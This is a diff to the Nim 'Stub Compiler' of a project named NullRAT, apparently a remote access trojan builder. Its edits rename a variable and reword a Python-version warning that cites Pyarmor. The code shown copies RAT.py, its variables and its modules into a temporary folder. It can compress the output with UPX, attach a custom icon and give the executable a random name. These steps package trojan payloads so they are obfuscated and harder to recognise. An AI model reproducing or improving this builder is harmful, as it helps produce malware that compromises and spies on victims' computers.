@@ -9,8 +9,8 @@ from utils import cleanWorkingDir, printName
 
 proc compiler*(): int = 
     printName()
-    var dirr = getAppDir()
-    setCurrentDir(dirr / "NullRAT")
+    var appDirectory = getAppDir()
+    setCurrentDir(appDirectory / "NullRAT")
     
     stdout.styledWriteLine({styleBright}, "  >> Stub Compiler <<")
     echo ""
@@ -22,7 +22,7 @@ proc compiler*(): int =
     var status = execProcess("python --version")
     for i in ["3.11", "3.12", "3.13", "3.14"]:
         if i in status: 
-            echo "Python ", i, " is not supported!\nUninstall and run the compiler again to auto-download the correct version!"
+            echo "Python ", i, " is not supported!\n - Pyarmor only supports max python version of 3.10\n - Uninstall Python and run this program again to auto-download the correct version!"
             sleep(5000)
             quit(0)
 
@@ -63,9 +63,9 @@ proc compiler*(): int =
     if compress:
         var path = getEnv("path")
         if path[^1] == ';':
-            putEnv("path", fmt"{path}{dirr}\NullRAT\upx;")
+            putEnv("path", fmt"{path}{appDirectory}\NullRAT\upx;")
         else:
-            putEnv("path", fmt"{path};{dirr}\NullRAT\upx;")
+            putEnv("path", fmt"{path};{appDirectory}\NullRAT\upx;")
         echo "Executable will be compressed (w/ upx)"
     if icon: 
         echo "Executable will have custom icon"
@@ -170,19 +170,19 @@ proc compiler*(): int =
         stdout.styledWriteLine(fgCyan, {styleBright}, "- Creating tempdir...")
         var folderName = "compiling-" & $rand(6969)
         createDir(folderName)
-        setCurrentDir(dirr / "NullRAT" / folderName)
+        setCurrentDir(appDirectory / "NullRAT" / folderName)
         var currdir = getCurrentDir()
         echo currdir
         
-        echo dirr / "NullRAT" / "RAT.py"
-        copyFile(dirr / "NullRAT" / "RAT.py", currdir / "RAT.py")
-        echo dirr / "NullRAT" / "Variables.py"
-        copyFile(dirr / "NullRAT" / "Variables.py", currdir / "Variables.py")
+        echo appDirectory / "NullRAT" / "RAT.py"
+        copyFile(appDirectory / "NullRAT" / "RAT.py", currdir / "RAT.py")
+        echo appDirectory / "NullRAT" / "Variables.py"
+        copyFile(appDirectory / "NullRAT" / "Variables.py", currdir / "Variables.py")
         if icon:
             copyFile(iconPath, currdir / "custom_icon.ico")
             
         var modules: seq[string]
-        for path in walkDir(dirr / "NullRAT" / "modules"):
+        for path in walkDir(appDirectory / "NullRAT" / "modules"):
             if "create_new" in $path.path.split("\\")[^1]:
                 continue
             echo $path.path
@@ -230,8 +230,8 @@ proc compiler*(): int =
         
         var name = $rand(6969) & ".exe"
         if fileExists(currdir / "dist" / "765678976567.exe"):
-            moveFile(currdir / "dist" / "765678976567.exe", dirr / name)
-        setCurrentDir(dirr / "NullRAT")
+            moveFile(currdir / "dist" / "765678976567.exe", appDirectory / name)
+        setCurrentDir(appDirectory / "NullRAT")
         removeDir(folderName)
         
         printName()
